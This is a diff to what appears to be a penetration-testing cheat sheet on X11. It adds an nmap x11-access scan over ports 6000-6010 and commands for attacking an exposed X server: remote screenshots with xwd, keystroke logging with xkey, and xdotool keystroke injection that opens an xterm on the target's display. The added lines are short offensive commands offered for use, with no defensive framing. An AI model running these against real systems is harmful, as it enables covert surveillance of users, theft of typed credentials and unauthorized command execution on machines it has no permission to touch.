@@ -41,7 +41,33 @@ ssh -1 <target IP>
 
 # X11
 
-nmap -Pn -n -T4 -p6000 --script=x11-access <target IP>
+nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>
 
 xspy <target IP>
+
+OS X
+     Screenshot:
+     xwd -display <targetIP>:<display> -root -out file.xwd
+
+     View screenshot:
+     xwud -in file.xwd
+
+     Key logging:
+     xkey <targetIP>:0.0 
+
+     xdotool inject:
+     Open another Terminal and type:
+
+     export DISPLAY=<ipaddress>:0
+
+     $ xdotool key x t e r m
+     $ xdotool key KP_Enter
+
+     Might need to inject 1 char at a time:
+
+     xdotool key x 
+     xdotool key t
+     xdotool key e
+     xdotool key r 
+     xdotool key m
 
